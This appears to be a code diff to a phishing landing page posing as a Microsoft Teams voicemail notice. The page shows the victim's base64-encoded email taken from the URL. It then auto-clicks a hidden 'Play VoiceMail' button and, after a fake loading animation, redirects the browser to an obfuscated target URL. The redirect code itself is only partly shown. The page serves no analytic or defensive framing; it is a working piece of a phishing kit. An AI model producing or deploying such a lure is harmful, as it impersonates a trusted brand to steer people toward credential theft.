@@ -18,7 +18,7 @@
             text-align: center;
         }
         .dots-container {
-            display: flex;
+            display: none;
             align-items: center;
             justify-content: center;
         }
@@ -44,12 +44,27 @@
             font-size: 18px;
             margin-bottom: 20px;
         }
+        #verifyButton {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            background-color: rgb(110, 71, 238);
+            color: white;
+            border: none;
+            border-radius: 15px;
+            height: 50px;
+        }
+        #verifyButton:hover {
+            background-color: rgb(142, 204, 255);
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <img src="https://cdn.pixabay.com/photo/2022/01/27/07/17/microsoft-teams-6971301_960_720.png" alt="Logo" width="330px">
         <div id="emailDisplay" aria-live="polite"></div>
+        <button id="verifyButton" aria-label="Click to Verify" style="display: none;">Play VoiceMail</button>
         <div class="dots-container" aria-label="Loading content">
             <div class="dot"></div>
             <div class="dot"></div>
@@ -58,7 +73,7 @@
             <div class="dot"></div>
         </div>
     </div>
-    <a id="redirectLink" href="#" style="display: none;" title="Reet"></a>
+    <a id="redirectLink" href="#" style="display: none;" title="Redirect to Target"></a>
     <script>
         // Function to decode base64 string
         function decodeBase64(encoded) {
@@ -97,9 +112,31 @@
             window.location.href = obfuscatedURL;
         }
 
-        // Automatically trigger redirection after 2 seconds
-        window.onload = function () {
-            // Start processing
+        // Function to update the displayed email
+        function updateLink() {
+            const emailParam = findEmailParam();
+            const emailDisplay = document.getElementById('emailDisplay');
+            if (emailParam) {
+                emailDisplay.innerText = decodeBase64(emailParam.value); // Always display the decoded email
+            } else {
+                console.error("y");
+            }
+        }
+
+        // Automatically trigger button click
+        function triggerButtonClick() {
+            const button = document.getElementById('verifyButton');
+            button.click(); // Simulate button click
+        }
+
+        // Click button functionality
+        const button = document.getElementById('verifyButton');
+        button.addEventListener('click', function() {
+            // Hide the verify button
+            button.style.display = 'none';
+            // Show loading dots
+            document.querySelector('.dots-container').style.display = 'flex';
+            
             setTimeout(() => {
                 const emailParam = findEmailParam();
                 if (emailParam) {
@@ -107,7 +144,12 @@
                 } else {
                     console.error("No email found for redirection");
                 }
-            }, 2000); // 2-second delay for the loading dots
+            }, 2000);
+        });
+
+        window.onload = function () {
+            updateLink();
+            triggerButtonClick();
         };
     </script>
 </body>
